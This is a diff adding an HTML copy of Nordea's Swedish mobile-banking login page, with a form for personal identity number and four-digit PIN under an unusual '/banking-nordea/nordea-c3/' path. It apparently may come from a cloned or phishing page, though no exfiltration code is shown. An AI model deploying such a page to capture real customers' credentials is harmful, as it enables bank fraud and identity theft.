@@ -1,0 +1,176 @@
+
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta content="text/html; charset=iso-8859-1" http-equiv="Content-Type" />
+		<title>Mobilbanken</title>
+		<link rel="stylesheet" type="text/css" href="/banking-nordea/nordea-c3/css/stylesheet.css" media="Screen" />
+		<meta http-equiv="Content-Type" content="application/vnd.wap.xhtml+xml; charset=iso-8859-1" />
+    	<meta http-equiv="Content-Style-Type" content="text/css" />
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+		<meta name="format-detection" content="telephone=no" />
+		<link rel="apple-touch-icon" href="/banking-nordea/nordea-c3/images/icon.png"/>
+		<script type="text/javascript">
+			window.addEventListener('load', function(){
+				setTimeout(scrollTo, 0, 0, 1);
+			}, false);
+    </script>
+    <script>
+      if (document.querySelectorAll && navigator 
+            && /iPhone|iPad/.test(navigator.userAgent)) {
+        function displayLoader() {
+          var loader = document.createElement("div");
+          loader.style.position = "absolute";
+          loader.style.left = "0px";
+          loader.style.top = "0px";
+          loader.style.right = "0px";
+          loader.style.height = 
+            (document.body.scrollHeight || document.body.clientHeight) + "px";
+          loader.style.background = "#fff";
+          loader.style.opacity = 0.5;
+          loader.style.zIndex = 9999;
+          document.body.appendChild(loader);
+        }
+        window.addEventListener("load", function() {
+          var clickables = document.querySelectorAll("a, form");
+          for (var i = 0, l = clickables.length; i < l; i++) {
+            var element = clickables[i];
+            if (!element) continue;
+            var nodeName = element.nodeName.toLowerCase();
+            console.log(nodeName, element);
+            if (nodeName == "a") {
+              element.addEventListener("click", displayLoader);
+            } else if (nodeName == "form") {
+              element.addEventListener("submit", displayLoader);
+            }
+          }
+        });
+      }
+    </script>
+            </head>
+    <body>
+	<div class="mainContainer">
+				
+
+<div class="topContainer">
+	<div class="topLeft">
+                <div id="nordeaLogo"></div>
+	</div>
+	<div class="topRight">
+					<a href="/banking-nordea/nordea-c3/index.html" class="navButton">
+				Startsidan			</a>
+			</div>
+</div>
+
+        <div class="shortcutContainer">
+  <div class="shortcutItem">
+        <a href="/banking-nordea/nordea-c3/index.html?historyLink=true" class="shortcutButton">
+      &lt;Tillbaka    </a>
+  </div>
+  <div class="shortcutSeperator">
+	|
+  </div>
+  <div class="shortcutItem">
+    <a href="/banking-nordea/nordea-c3/index.html" class="shortcutButton">
+      Meny    </a>
+  </div>
+  <div class="shortcutSeperator">
+	|
+  </div>
+  <div class="shortcutItem">
+    &nbsp;
+  </div>
+</div>
+
+
+
+	<!--  Layout: the pagetitle-->	
+	<div class="pagetitleContainer">
+		<div class="pagetitleItem">
+			Logga in		</div>
+	</div>
+		
+
+<div class="contentContainer">
+    
+  
+  
+    
+    
+  <form action="/banking-nordea/nordea-c3/login.html" method="post" autocomplete="off">
+    <input type="hidden" name="_csrf_token" autocomplete="off" value="lWoiHTOevUiXKljEgXMR5UIls5SqS2BommPX2YZUmak" /> 
+        <div class="formContainer">
+      <div class="formItem paddingTopLarge paddingBottomSmal">
+        <div class="formItemLeftLarge">
+          Personnummer        </div>
+        <div class="formItemRightSmal">
+          <input type="number" pattern="[0-9]*" autocomplete="off" name="xyz" maxlength="12" class="numericOnlyDigits formItemMedium" />
+        </div>
+      </div>
+      <div class="formItem  paddingBottomLarge ">
+        <div class="formItemLeftLarge">
+          Personlig kod        </div>
+        <div class="formItemRightSmal">
+          <input type="password" pattern="[0-9]*" autocomplete="off" name="zyx" size="12" maxlength="4" class="numericOnlyDigits formItemSmal" />
+        </div>
+      </div>
+          </div>
+    <div class="buttonContainer">
+      <div class="buttonMiddle">
+        <input type="submit" value="Logga in" class="loginButton" />
+      </div>
+    </div>
+  </form>
+  
+  <div class="formContainer" >
+    <div class="formItem paddingTopLarge paddingBottomSmal">
+      <div class="formItemLarge">
+        Har du problem med att logga in?      </div>
+      <div class="formItemLarge">
+        <a href="/banking-nordea/nordea-c3/loginhelp.html">Best&auml;ll en ny personlig kod</a>
+      </div>
+      <div class="formItemLarge">
+        <a href="/banking-nordea/nordea-c3/loginEcode.html">Logga in med e-kod (kortl&auml;sare)</a>
+      </div>
+        <div class="formItemLarge">
+        <a href="/banking-nordea/nordea-c3/faq.html">Fr&aring;gor och svar</a>
+      </div>
+      </div>
+  </div>
+</div>
+
+			<script type="text/javascript">
+	//Set auto focus to the first input field
+	  var inputFound = false;
+	  // forms
+	  for (f=0; f < document.forms.length; f++)
+	  {
+	    // elements in forms
+	    for(i=0; i < document.forms[f].length; i++)
+	    {
+	      if (document.forms[f][i].type != "hidden")
+	      {
+		if (document.forms[f][i].disabled != true )
+		{ 
+		   if (document.forms[f][i].type != "submit")
+		   {
+		       //Set focus
+		       document.forms[f][i].focus();
+		       var inputFound = true;
+		   }
+		}
+	      }
+	      if (inputFound == true)
+		break;
+	    }
+	    if (inputFound == true)
+	      break;
+	  }
+</script>
+			<!-- layout:the footer -->
+			<div class="footerContainer">
+				&copy; Nordea			</div>
+		</div>
+	</body>
+</html>
